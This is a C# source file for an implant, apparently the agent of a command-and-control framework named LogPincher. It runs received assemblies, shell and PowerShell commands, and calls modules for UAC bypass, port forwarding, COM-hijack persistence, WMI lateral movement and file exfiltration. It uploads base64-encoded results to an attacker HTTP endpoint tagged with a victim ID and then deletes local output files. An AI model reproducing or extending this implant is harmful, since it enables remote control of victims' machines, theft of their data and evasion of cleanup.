using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Reflection;
using Microsoft.Win32;


namespace CSharpImplant
{

    static class CSharpImplant
    { 
        public static string attackerip = "127.0.0.1";
        public static string attackerport = "80";
        public static string outputUri = "http://" + attackerip + ":" + attackerport + "/output";
        public static string victimid = getVictimID();
        public static string outputfile = Path.GetTempPath() + "implant.txt";

        public static void Main(string[] args)
        {

            //Parse string then pass to CLR instance
            string command = Uri.UnescapeDataString(args[0]).Remove(0, 8);
            
            if (command.Contains("Execute-Assembly"))
            {
                runMethod(command, "RunAssembly");
                File.WriteAllText(outputfile, command + "\n" + Convert.ToBase64String(File.ReadAllBytes(outputfile)));
                sendFile();
            }

            if (command.Contains("Execute-Command"))
            {
                command = command.Remove(0, 16);
                var output = runMethod(command, "RunCommand");
                basicWrite(output, command);
                sendFile();
            }

            if (command.Contains("Execute-Powershell"))
            {
                command = command.Remove(0, 19);
                var output = runMethod(command, "RunPowershell");
                basicWrite(output, command);
                sendFile();
            }

            if (command.Contains("Bypass-UAC"))
            {
                var output = runMethod(command, "BypassUAC");
                basicWrite(output, command);
                sendFile();
            }

            if (command.Contains("Create-PortForward"))
            {
                var output = runMethod(command, "CreatePortForward");
                basicWrite(output, command);
                sendFile();
            }

            if (command.Contains("Delete-PortForward"))
            {
                var output = runMethod(command, "DeletePortForward");
                basicWrite(output, command);
                sendFile();
            }

            if (command.Contains("Persist-COMObject"))
            {
                command = command.Remove(0, 18);
                var output = runMethod(command, "COMHijack");
                basicWrite(output, command);
                sendFile();
            }
           
            if (command.Contains("Exfil-File")) //Make this
            {
                var output = runMethod(command, "ExfilFile");
                WebClient upload = new WebClient();
                upload.Headers.Set("victimid", victimid);
                upload.UploadFile(outputUri, "POST", output.ToString());
                while (upload.IsBusy) { Thread.Sleep(1000); }
                upload.DownloadString(outputUri + "?victim=" + victimid);
                upload.Dispose();
                File.Delete(Path.GetTempPath() + "output.docx");
                Directory.Delete(Path.GetTempPath() + "testing", true);

            }

            if (command.Contains("Lateral-WMI")) //Make this
            {
                var output = runMethod(command, "LateralWMI");
                Console.WriteLine(output.ToString());
                //sendFile();
            }
        }

        public static object runMethod(string command, string method)
        {
            byte[] bytes = File.ReadAllBytes(@"C:\Users\sdavis\Documents\GitHub\LogPincher\VSProj\LogPincher\CSharpImplantModule\CSharpImplantModule\bin\Debug\CSharpImplantModule.dll");
            AppDomain appDomain = AppDomain.CreateDomain("AP1", null, new AppDomainSetup());
            var assmblyLoaderType = typeof(AssmeblyLoader);
            var assemblyLoader = (IAssemblyLoader)appDomain.CreateInstanceFromAndUnwrap(assmblyLoaderType.Assembly.Location, assmblyLoaderType.FullName);
            var start = assemblyLoader.Load(bytes, command, method);
            AppDomain.Unload(appDomain);
            return start;
        }

        public static string getVictimID()
        {
            RegistryKey openReg = Registry.CurrentUser.OpenSubKey("Software\\Classes\\windows", true);
            string victimid = openReg.GetValue("URL Protocol").ToString();
            return victimid;
        }

        public static void basicWrite(object output, string command)
        {
            File.WriteAllText(outputfile, command + "\n" + Convert.ToBase64String(Encoding.UTF8.GetBytes(output.ToString())));
        }
    
        static void sendFile()
        {
            WebClient upload = new WebClient();
            upload.Headers.Set("victimid", victimid);
            upload.UploadFile(outputUri, "POST", outputfile);

            File.Delete(outputfile);

            while (upload.IsBusy) { Thread.Sleep(1000); }
            upload.DownloadString(outputUri + "?victim=" + victimid);
            upload.Dispose();
            }
        }
    }

    public class ProxyClass : MarshalByRefObject { }

    public interface IAssemblyLoader
    {
        object Load(byte[] bytes, string command, string method);
    }

    public class AssmeblyLoader : MarshalByRefObject, IAssemblyLoader
    {
        public object Load(byte[] bytes, string command, string method)
        {
            var assembly = AppDomain.CurrentDomain.Load(bytes);
            Type myType = assembly.GetType("TestClass");

            if (myType != null)
            {
                object obj = Activator.CreateInstance(myType);
                MethodInfo myMethod = myType.GetMethod(method);
                object[] parameters = new object[1];
                parameters[0] = command;
                var test = myMethod.Invoke(obj, parameters);

                return test;
            }
            return "Command not executed";
        }
    }